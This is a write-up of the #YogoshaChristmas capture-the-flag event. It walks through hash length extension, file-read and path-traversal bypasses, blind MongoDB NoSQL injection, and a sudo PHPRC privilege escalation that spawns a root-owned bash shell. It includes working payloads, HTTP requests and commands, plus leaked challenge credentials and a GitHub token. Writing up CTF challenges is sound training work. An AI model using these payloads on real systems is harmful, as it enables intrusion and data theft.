# #YogoshaChristmas Writeup

The 28th of December evening and the 29th of December I played the #YogoshaChristmas CTF. At the time I played quite a lot of hints have been already published and as I'm a lazy person I read all of them.  
As I'm writing this right after completing the last challenge I'm including the hints which are out now, any other hint published later won't appear here.  
For the records: I scored the 3th place.

## Welcome Christmas
```
Konoha village in Naruto is also enjoying Christmas but I heard there is a possible coup d'etat from a clan there :/ ShisuiYogo is a hero trying to save his village and clan. He shared something interesting that can lead you \o/
Please make sure to read the rules
Best Of luck Everyone and Merry Christmas From Yogosha Team
Flag Format: Yogosha{L33t}
```

Hint1: `I heard that ShisuiYogo is a Body Flicker user ? Does this have a meaning ?`

Hint2: `Each Picture has some interesting Information stored in it; https://about.facebook.com/meta/`

The two hints were basically describing the solution themself:  
1. Search for a user called ShisuiYogo
2. Find the user on Twitter (https://twitter.com/ShisuiYogo)
3. Search for its name (Uchiha Shisui) on Flickr (https://www.flickr.com/photos/194671113@N07)
4. Download the only photo of the user in the original quality
5. Run `exiftool` on it and read the metadata

```
$ exiftool 51773456833_95c363f276_o.png 
    [...SNIP...]
    Envelope Record Version         : 4
    Object Name                     : Yogosha{Shisui_H4s_G00d_ViSion}
    Caption-Abstract                : I heard something important is stored in /secret.txt here: http://3.141.159.106 ; Maybe the akatsuki will help the Uchiha clan ?
    [...SNIP...]
```

**FLAG:** `Yogosha{Shisui_H4s_G00d_ViSion}`

---

## Uchiha Or Evil ?

```
You found some important stuffs! The hockage is proud of you o// Let's dive in the real stuff now can you really hack the uchiha ?
````

Hint1: `Is using hashes that way always secure ? Shisui is not sure about that since the old state of a hash is saved 👀`  

After visiting the URL obtained from the previous challenge you are presented with a static web page.  
Doing some basic directory enumeration leads you to the following `robots.txt` file:
```
User-agent: Uchiha
Allow: /read.php
```  
With such information it's enough to visit `read.php` with the suggested `User-agent` to reach a page where it is possible to read the source code of itself.
```php
<?php
if ($_SERVER['HTTP_USER_AGENT']!=="Uchiha"){
	echo "Access Denied. Only Uchiha clan can access this";
}
else{
?>
[...SNIP...]
<?php
include "secret.php";
if(isset($_POST['string'])){
	$arr=explode("|",$_POST['string']) ;
	$filenames=$arr[1];
	$hash=$arr[0];
	if($hash===hash("sha256", $SECRET.$filenames ) && preg_match("/\//",$filenames)===0 ){
		foreach(explode(":",$filenames) as $filename){
			if(in_array($filename,["read.php","index.php","guinjutsu.php"])) {
				$jutsu=file_get_contents($filename);
				echo "Sharingan: ".$jutsu;
		}
		}
	}
	else{
		echo "Verification Failed! You didn't awaken your sharingan!";
	}

}

}
?>
```
Crypto-speakers would have already guessed that we are in a very common scenario: [hash length extension](https://en.wikipedia.org/wiki/Length_extension_attack).  
In fact we have an hashing function (sha256) which is executed on a re-used secret value, followed by an user-controlled one.  
As we have a valid hash for a valid input, we could exploit the hash length extension to forge a valid hash for a different input (different as in with an arbitrary suffix).  
While this is nice, we should also understand the application logic to see if we could abuse it.  
Hopefully for us, the application verifies the hash, then it splits the input by the colon (`:`) character and finally loops all the array elements. If one or more of the elements match one of the allowed filenames, then its content is read and shown in the response.  
Being the hash length extention a pretty old and well-know attack, it is enough to use an off-the-shelf tool to exploit it: [hash_extender](https://github.com/iagox86/hash_extender).  
As we don't know the secret length we need to guess it. In order to do that we can run the following command and try the various input after hex-decoding them:
```sh
for i in $(seq 100)
do
    ./hash_extender --data read.php --secret $i --append ":guinjutsu.php" --signature 184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5 --format sha256
done
```
By trying them you would notice that 41 is the correct secret length as you will get with the hash + input calculed with a 41 character long secret you get the source code of the `guinjutsu.php` file:
```php
<?php

function check($url)
{
    $par = parse_url($url);
    if ( ( (strpos($par['scheme'], 'http') !== false) and ($par['host'] == 'uchiha.fuinjutsukeeper.tech') ) and ($par['port'] == 5000) )
    {
        return True;

    }
    else
    {
        return False;
    }

}

if (isset($_POST['submit']))
{
    if ((isset($_POST['api'])) and (isset($_POST['endpoint'])))
    {
        $url = $_POST['api'] . $_POST['endpoint'];
        if (check($url))
        {
            $opts = array(
                'http' => array(
                    'method' => "GET",
                    'follow_location' => false,
                    'header' => "Accept-language: en\r\n"
                )
            );
            $context = stream_context_create($opts);
            $file = file_get_contents($url, false, $context);
            echo $file;

        }
    }
}

?>
```
This step took me some time as I was unsure on how to proceed and I focused too much on core PHP bugs ([73192](https://bugs.php.net/bug.php?id=73192), [77423](https://bugs.php.net/bug.php?id=77423), [81604](https://bugs.php.net/bug.php?id=81604)) regarding `parse_url`.  
Then I realized that the check on the `scheme` was lax and it only checked the presence of the string http.  
This means that `httpa://uchiha.fuinjutsukeeper.tech:5000/a` is considered a valid url by the `check` function.  
When it then reaches the `file_get_contents`, PHP tries to resolve the `httpa` scheme and when it fails, it throws a warning and uses the url as a filesystem path (yes, I know, PHP is 😨).  
So this url would do the trick and allows us to read the `/secret.txt` file: `httpa://uchiha.fuinjutsukeeper.tech:5000/../../../../../../../../secret.txt`.  

```
Yogosha{Master_Of_ArbitraRy_ReAdiNg_JuTsu}
Someone calling himself madara said to Itachi to kill everyone, I'm not sure about this intel but if it's right no one can beat Itachi except Shisui. Check this forum they are using http://3.141.109.49
```

**Flag:** `Yogosha{Master_Of_ArbitraRy_ReAdiNg_JuTsu}`

---

## Js and Uchiha Are Evils

```
Wow you are really about to save the village! Continue further and you will surely win :D
```

Hint1: `I heard that there is totally 10000 articles,this number will really help if you focus closely on the used functions :D /jutsu/1 is handy if you haven't seen it \o/`  
Hint2: `This check is done at the first line: if (/^[\b\t\n\v\f\r \xa0]*-/.test(req.params.id)) { Is checking negative jutsus is safely done ?`

Once again we start with the URL from the previous challenge, which shows what follows:
```
I heard that there is something interesting in jutsu number 1337, it's the most secret one!!
```

While, when visiting the justsu number 1 we get:
```
I'm using the following to avoid access to jutsus higher than 9; is it safe? :
  let id = parseInt(request.params.id, 10);
  // baka saijin can't read the jutsus with id >9
        if (id > 9) {
                return res.render('jutsu',{jutsu:'Access Denied sorry'})
        }
	const jutsu = articles.at(id) ?? {
    		jutsu: 'Not found'
  	};
	return res.render('jutsu',jutsu);

``` 
The hints guide us once more to the right path: we need to find a way to use a negative jutsu.  
First of all the [`ParseInt`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt) function ignores any leading whitespace.  
Unfortunately the application checks all the standard whitespaces before a minus sign, so it's ime to read some [ECMAScript documentation](https://tc39.es/ecma262/#sec-white-space) to understand what's a whitespace in JS!  

![ECMAScript documentation](./whitespaces.png)  

Now we know that any `Space_Separator` character would work. Maybe we could find some multibyte ones?  
Hopefully there are quite a lot and from [here](https://www.compart.com/en/unicode/category/Zs) we could get the UTF-8 encoded version (which we could easily URL-encode).  

Wrapping everything together we could put a space, which is not caught by the RegExp, followed by a negative number: `http://3.141.109.49/jutsu/%E2%80%AF-1`.  
As I'm *very* lazy I then fired my [Burp Suite](https://portswigger.net/burp) Intruder to try every number from `-1` to `-9999` waiting for something to show up.  
After some seconds I got a different response for `-8663`:
```
Wow,Awesome Jutsu! It's called Dockeru. I stored the jutsu code there: id=shisuiyogo pass=YogoShisuiIsStrong image=forum
```

This is where the *guessy* part kicked in.  
I spent ages thinking about where those information should be used.  
At a first glance I tried them on the `/login` endpoint without any clue, then via SSH but it accepted key-auth only.  
I was very close to give up, when I tried to search on Docker Hub if a `shisuiyogo` user existed and [it was the case](https://hub.docker.com/u/shisuiyogo)...  

I quickly logged in via `docker login`, I pulled the `shisuiyogo/forum` image, and run a shell into it to check the `index.js` file:
```js
const express = require('express');
const app=express();
const { MongoClient, ObjectID } = require('mongodb');
const MONGO_URL=process.env.MONGO_URL;
const SECRET=process.env.SECRET;
const bodyParser = require('body-parser');
const got=require('got') ;
const session=require("express-session");
const ejs=require("ejs");
app.use(bodyParser.urlencoded({extended:false}));
app.use(bodyParser.json());
app.use(session({secret:SECRET,resave:false,saveUninitialized:false}))
app.use(express.static('static'));
app.set('views', './views');
app.set('view engine', 'ejs');
const client = new MongoClient(MONGO_URL);

//Insert important infos in the DB
var services=[
{"Service":"web","username":"shisui","password":"Random","IP":"0000"},
{"Service":"web","username":"itachi","password":"Secure","IP":"127.0.0.1"},
{"Service":"ssh","username":process.env.USERNAME,"password":process.env.PASSWORD,"IP":process.env.IP},
{"Service":"net","username":"sasuke","password":"Random","IP":"0000"}
];
client.connect(function (err){
	if (err) return res.render("register",{error:"An unknown error has occured"});
	const db=client.db("uchiha");
	const collection=db.collection("services");
	collection.insertMany(services,function(err, res) {
		if (err) console.log(err);
		console.log("Number of documents inserted: " + res.insertedCount);
  	});

});


//generate jutsus
//credits Harekaze Mini CTF 
let articles = [];
articles[0]={jutsu:"I heard that there is something interesting in jutsu number 1337, it's the most secret one!!"};
articles[1]={jutsu:`I'm using the following to avoid access to jutsus higher than 9; is it safe? :
let id = parseInt(request.params.id, 10);
  // baka saijin can't read the jutsus with id >9
        if (id > 9) {
                return res.render("jutsu",{jutsu:"Access Denied sorry"})
        }
`};
for (let i = 2; i < 10000; i++) {
  articles.push({
    jutsu: 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.'.trim()
  });
}
articles[1337] = {
  jutsu: `Wow,Awesome Jutsu! It's called Dockeru. I stored the jutsu code there: id=shisuiyogo pass=YogoShisuiIsStrong image=forum  `
};


app.get("/",(req,res)=>{
	return res.render("index");
});
app.get("/jutsu/:id",(req,res)=>{
	if (/^[\b\t\n\v\f\r \xa0]*-/.test(req.params.id)) {
		return res.render("jutsu",{"jutsu":"Hacking Attempted"});
	}
	  let id = parseInt(req.params.id, 10);

  // baka saijin can't read the jutsus with id >9
	if (id > 9) {
		return res.render("jutsu",{jutsu:"Access Denied sorry"})
	}
	const jutsu = articles.at(id) ?? {
    		jutsu: 'Not found'
  	};
	return res.render("jutsu",jutsu);
});

app.get("/login",(req,res)=>{
	if(req.session.username){
		res.redirect(302,"/home");
	}
	else{
		return res.render("login",{error:""});
	}
})


app.post("/login",(req,res)=>{
	var username=req.body.username;
	if(username){
		got.get(`http://3.141.109.49/auth/${encodeURI(username)}/users`).then((resp)=>{
		if (resp.statusCode==200){
			req.session.username=username;
			return res.redirect(302,"/home");
		}
		else{
			return res.render("login",{error:"Your username is wrong"});
		}
		}).catch((err)=>{return res.render("login",{error:"Your username is wrong"});});
	}
	else{
		return res.redirect(302,"/login");
	}

});

app.get("/home",(req,res)=>{
	if(req.session.username){
		return res.render("home",{"username":req.session.username});
	}
	else{
		res.redirect(302,"/login");
	}

});

app.get("/services",(req,res)=>{
	if(req.session.username){
		return res.render("service",{error:""});
	}
	else{
		return res.redirect(302,"/login");
	}
});

app.post("/services",(req,res)=>{
	if(req.session.username){
		if (req.body.service){
			var query=JSON.parse(`{"Service":"${req.body.service}"}`);
			client.connect(function(err){
				if (err) return res.render("service",{error:"An unknown error has occured"});
			const db=client.db("uchiha");
			const collection=db.collection("services");
			collection.findOne(query,(err,result)=>{
				if (err) return res.render("service",{error:"An unknown error has occured"});
				if (result) {
					return res.render("service",{error:"Service is UP"});
				}
				else{ return res.render("service",{error:"Service is Down"})};
			});
			});
		}
		else{
			return res.render("service",{error:"An unknown error has occured"});

		}
	}

else { return res.redirect(302,"/login");}

});

//authentication
app.get("/auth/:username/users",(req,res)=>{
	if (req.params.username==process.env.REDACTED){
		return res.send("OK");
	}
	else{
		return res.sendStatus(202);
	}
}
)

app.listen(8000,"0.0.0.0");
console.log("Listening 8000 ..");
```

Finally some sourcecode!  
First of all I checked the `/login` endpoint: it simply performs a GET request on its own by adding the username parameter as a path param. If it gets a 200, then it creates a new user session.  
The bypass is pretty straightforward: you set as username `../../#` and you force it to visit a page (the home) which always replies with a 200.  

That being done it's time to move on the `/services` endpoint. It accepts a service parameter, puts a prefix and a suffix to create a JSON and finally uses it as a query for a MongoDB.  
In the very first lines of the sourcecode we could get the DB structure and we understand that there is an SSH service, where all the information are got from the environment, which we miss.  
If you ever played around with MongoDB you probably know that using user-supplied input in queries is as bad as doing it SQL. Yes, this is a NOSQL injection (this name still soulds weird to me).  
The injection is blind as we could just know if the query is `True` or `False` by observing if in the response there is "Service is UP" or "Service is DOWN".  
Luckly for us this is enough to be combined with the [`$regex` operator](https://docs.mongodb.com/manual/reference/operator/query/regex/) of MongoDB (you can use it as kind of a `LIKE` in SQL) to leak char by char the content of the password, username, and IP fields.  
Example:
- The following input: `ssh","userame":{"$regex":"^a"},"Service":"ssh`.
- Becomes the following JSON: `{"Service":"ssh","userame":{"$regex":"^a"},"Service":"ssh}`.
- Which, when used as query, will return "Service is UP" if the first char of username is "a" or "Service is DOWN" if it is not.

Following that approach it was possible to extract the credentials and the IP of the SSH service:  
`{"Service":"ssh","username":"shisuiedo","password":"YogoshaxShisui","IP":"52.2.9.67"}`

A quick `nmap` of the target shows that both on port `22` and `1337` an SSH service is exposed. While on port `22` only key-based authentication is accepted, on port `1337` username+password is allowed, and the ones extracted are correct!  

Fun fact: after connecting via SSH the flag is shown in the banner but I didn't realize it and went straight to the end of chall 4...  

```
$ ssh shisuiedo@52.2.9.67 -p 1337
 _   _      _     _ _           
| | | | ___| |__ (_) |__   __ _ 
| | | |/ __| '_ \| | '_ \ / _` |
| |_| | (__| | | | | | | | (_| |
 \___/ \___|_| |_|_|_| |_|\__,_|
                                
Yogosha{Uchiha_SerVicE_To_Kill_DanzO}
shisuiedo@52.2.9.67's password: 

```

**Flag:** `Yogosha{Uchiha_SerVicE_To_Kill_DanzO}`

---

## Uchiha As A Service

```
Uchihas run services now ? That's nice! The final challenge will be posted the 27th of December :D the flag you found is fake stay tuned! final part will be published so soon.
```

After SSH-ing into the server my *muscle memory* forced me into typing `ls -la` and I immediately knew the goal was to escalate my privileges to the ones of `user-privileged`:
```
user1@2e38c07ad821:/home/user1$ ls -la
total 24
drwxrwxr-t 1 root  user1           4096 Dec 28 00:42 .
drwxr-xr-x 1 root  root            4096 Dec 27 10:48 ..
-rw-r--r-- 1 user1 user1            220 Aug  4 20:25 .bash_logout
-rw-r--r-- 1 user1 user1           3526 Aug  4 20:25 .bashrc
-rw-r--r-- 1 user1 user1            807 Aug  4 20:25 .profile
-rwxr----- 1 root  user-privileged  137 Dec 28 00:42 secret.txt
```

Right after that I tried the usual `sudo -l` to understand if I had the ability to run something as the target user:
```
user1@2e38c07ad821:/home/user1$ sudo -l
Matching Defaults entries for user1 on 2e38c07ad821:
    mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+="HOSTNAME KAHLA HELL PHPRC HTTP SHELL"

User user1 may run the following commands on 2e38c07ad821:
    (user-privileged) NOPASSWD: /usr/local/bin/php /dev/null
```

First reaction was: "Snap, is it that easy? Could I really simply run php as the target user and spawn an interactive bash shell via `system("bash -i");`?"  
Then I realized the `/dev/null`, which means "load nothing as input, run it, and exit".  
Before moving to [GTFOBins](https://gtfobins.github.io/) to check if anyone in the past encountered a similar scenario I had a closer look to the `sudo` conf and I noticed that an environment variable called `PHPRC` was kept when running `sudo` commands.  
As I wasn't aware of it I went for some Googling and found this: https://www.php.net/manual/en/configuration.php  
```
For those people who want to use the PHPRC environment variable:
You have to specify the path to the directory containing your php.ini, not the direct path to the php.ini.

Example (php.ini resides in /your/path/php.ini):
right:
export PHPRC=/your/path

wrong:
export PHPRC=/your/path/php.ini
```

Nice, so we could specify where to load the php.ini (the file containing the PHP configurations) from!  
Being a PHP *afecionado*, mainly when it comes to pwning it, I already knew that if you control the php.ini content (it's funny writing this while everyone is yelling at the [Log4J 2.17.0 code injection via a malicious config file](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-44832)) you can add a [auto_prepend_file](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file), which basically loads a given PHP file before anything else.  
This was enough to wrap up a working exploit for the privilege escalation:
```
user1@2e38c07ad821:/home/user1$ echo 'auto_prepend_file=/home/user1/a.php' > php.ini
user1@2e38c07ad821:/home/user1$ echo '<?php system("bash -i");' > a.php
user1@2e38c07ad821:/home/user1$ PHPRC=/home/user1/ sudo -u user-privileged /usr/local/bin/php /dev/null
user-privileged@2e38c07ad821:/home/user1$ id
uid=1001(user-privileged) gid=1001(user-privileged) groups=1001(user-privileged)
user-privileged@2e38c07ad821:/home/user1$ cat secret.txt 
Flag=Yogosha{Uchiha_As_a_Service_Is_N0t_SecUr3}
Repo=https://github.com/shisuiYogo/killer
Token=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
```

**Flag:** `Yogosha{Uchiha_As_a_Service_Is_N0t_SecUr3}`

---

## Final Beast

```
Uchihas run services now ? That's nice! The final challenge will be posted the 27th of December :D the flag you found is fake stay tuned! final part will be published so soon.
```

After git cloning the repository from https://github.com/shisuiYogo/killer with the obtained Github token, a NodeJS web application, with all the Dockerfiles to deploy it, was obtained.  
A quick look to it show us that the goal is to read a file called `flag.txt` placed in the root of the server filesystem.  
I looked at the code to find which functions were actually interacting with the filesystem and only one came up:
```js
app.post("/guinjutsu",function(req,res){
	//implement a filter for usernames starting only with uchiha! We are racist in Uchiha clan
	const filter={};
	merge(filter,req.body);
	console.log(req.session.isAdmin,req.session.username);
	if(req.session.isAdmin && req.session.username){
	var filename=req.body.filename;
	if (filename.includes("../")){
		return res.send("No No Sorry");
	}
	else{
		filename=querystring.unescape(filename);
		const data = fs.readFileSync(path.normalize("./"+filename), 'utf8');
		return res.send(data);
	}
	}
	else{
		res.send("Not Authorized");
	}

});
```

Out of curiosity I tried to visit such endpoint (expecting to see a "Not Authorized") and with my big surprise I saw this:
```
TypeError: Cannot read properties of undefined (reading &#39;includes&#39;)
    at /data/index.js:151:15<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/data/node_modules/express/lib/router/layer.js:95:5)
    at next (/data/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/data/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/data/node_modules/express/lib/router/layer.js:95:5)
    at /data/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/data/node_modules/express/lib/router/index.js:341:12)
    at next (/data/node_modules/express/lib/router/index.js:275:10)
    at /data/node_modules/body-parser/lib/read.js:130:5<
    at invokeCallback (/data/node_modules/raw-body/index.js:224:16)
```

**WHAT THE HACK?!** Did the dev really forgot some checks...? Looks like my request hit the line `if (filename.includes("../")){` even tho I didn't login or tried to bypass the `isAdmin` check.

Without thinking once more, I added a filename parameter to my request and url-encoded the path twice: this is done to bypass the `../` check, in fact the `../` is sent as `%252e%252e%252f`, which is then processed this way:
1. The webserver decodes it to `%2e%2e%2f`.
2. The string is checked against `../` and the check is passed.
3. The string is decoded by `querystring.unescape` which acts in a regular situation as `decodeURIComponent` and becomes `../`
4. The string is used to read the file, meaning we have a path traversal.

The following request lead me to the last flag:
```http
POST /guinjutsu HTTP/1.1
Host: 54.157.87.12
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

filename=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fflag.txt
```

**Flag:** `Yogosha{You_Have_Really_Nailed_IT_And_Saved_Konoha}`

## [Bonus] Revenge

This challenge was not meant to be release but in the end it was as a 0 points one which fixes part of the bugs of the "Final Beast".

```
This is my revenge for Final Beast , Have fun solving it , if it's solvable ofc.. Flag is in /flag.txt
Link: http://54.157.87.12:1337
Congrats on completing all the previous challenges \o/
```

Attached to the challenge there was also the update `index.js`:
```javascript
var express=require("express");
var bodyParser=require("body-parser");
var fs = require('fs');
var path=require("path");
var querystring=require("querystring");
const { MongoClient, ObjectID } = require('mongodb');
const MONGO_URL=process.env.MONGO_URL;
const SECRET=process.env.SECRET;
var app=express();
const session=require("express-session");
const ejs=require("ejs");
const sanitize=require("mongo-sanitize");
app.use(session({secret:SECRET,resave:false,saveUninitialized:false}))
app.use(express.static('static'));
app.set('views', './views');
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({extended:true}));
const client = new MongoClient(MONGO_URL,{useUnifiedTopology: true});

const UNSAFE_KEYS = ["__proto__", "constructor", "prototype"];

const merge = (obj1, obj2) => {
  for (let key of Object.keys(obj2)) {
    if (UNSAFE_KEYS.includes(key)) continue; 
    const val = obj2[key];
    key = key.trim();                        
    if (typeof obj1[key] !== "undefined" && typeof val === "object") {
      obj1[key] = merge(obj1[key], val);     
    } else {
      obj1[key] = val;                     
    }
  }

  return obj1;
};


app.post("/guinjutsu",function(req,res){
	//implement a filter for usernames starting only with uchiha! We are racist in Uchiha clan
	const filter={};
	merge(filter,req.body);
	console.log(req.session.isAdmin,req.session.username);
	if(req.session.isAdmin && req.session.username){
	var filename=req.body.filename;
	if (filename.includes("../")||filename.includes("%2f")||filename.includes("%2E")||filename.includes("%2e")||filename.includes("%2F")||filename.includes(".")){
		return res.send("No No Sorry");
	}
	else{
		filename=querystring.unescape(filename);
		const data = fs.readFileSync(path.normalize("./"+filename), 'utf8');
		return res.send(data);
	}
	}
	else{
		res.send("Not Authorized");
	}

});

app.listen(5555);
console.log("Listening on 5555")
```

So it looks like all the authentication part disappeard and a fix for the trivial path traversal was added.

Looking into the fix makes the target pretty clear: finding a way to have a string which is decoded in a way by the default `decodeURIComponent` and a different one by `querystring.unescape`.  

To do that I went through the [`querystring` sourcecode](https://github.com/nodejs/node/blob/e5873d786249d9b6aa1d8c422f856036c2c53e5e/lib/querystring.js).  

The `unescape` function uses `decodeURIComponent` but if it fails then a custom function is used:
```javascript
function qsUnescape(s, decodeSpaces) {
  try {
    return decodeURIComponent(s);
  } catch {
    return QueryString.unescapeBuffer(s, decodeSpaces).toString();
  }
}

function unescapeBuffer(s, decodeSpaces) {
  const out = Buffer.allocUnsafe(s.length);
  let index = 0;
  let outIndex = 0;
  let currentChar;
  let nextChar;
  let hexHigh;
  let hexLow;
  const maxLength = s.length - 2;
  // Flag to know if some hex chars have been decoded
  let hasHex = false;
  while (index < s.length) {
    currentChar = StringPrototypeCharCodeAt(s, index);
    if (currentChar === 43 /* '+' */ && decodeSpaces) {
      out[outIndex++] = 32; // ' '
      index++;
      continue;
    }
    if (currentChar === 37 /* '%' */ && index < maxLength) {
      currentChar = StringPrototypeCharCodeAt(s, ++index);
      hexHigh = unhexTable[currentChar];
      if (!(hexHigh >= 0)) {
        out[outIndex++] = 37; // '%'
        continue;
      } else {
        nextChar = StringPrototypeCharCodeAt(s, ++index);
        hexLow = unhexTable[nextChar];
        if (!(hexLow >= 0)) {
          out[outIndex++] = 37; // '%'
          index--;
        } else {
          hasHex = true;
          currentChar = hexHigh * 16 + hexLow;
        }
      }
    }
    out[outIndex++] = currentChar;
    index++;
  }
  return hasHex ? out.slice(0, outIndex) : out;
}
```

To crash `decodeURIComponent` it's enough to put a `%` sign followed by one or more characters not in the `%00` - `%7f` range.  
Once inside the `unescapeBuffer` we can see that a `Buffer` of the string length is allocated and then the characters are parsed using the `String.charCodeAt` function.  
As a `Buffer` can only contain a character from `0` to `255` it will apply a `mod` on every bigger one.  
This means that if we want to have the `.` character, which is `46` in the ASCII table, we could use any character which `charCodeAt % 256` is `46`.  
From an old but gold [presentation](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) of [Orage 🍊](https://twitter.com/orange_8361) I remembered of the `(U+FF2E) Full width Latin capital letter N` which is a great candidate here.  

We could easily verify our assumptions by running the following JavaScript code:
```javascript
const assert = require('assert');

const out = Buffer.allocUnsafe(1);
out[0] = 'Ｎ'.charCodeAt(0)
assert('Ｎ'.charCodeAt(0) % 256 == 46);
assert(out[0] == 46);
```

Finally we could wrap up everything together and send the following request:
```http
POST /guinjutsu HTTP/1.1
Host: 54.157.87.12:1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

filename=%/ＮＮ/ＮＮ/ＮＮ/flagＮtxt
```

**Flag:** `Yogosha{It_SeemS_Icouldn'T_Get_My_RevengE_After_All}`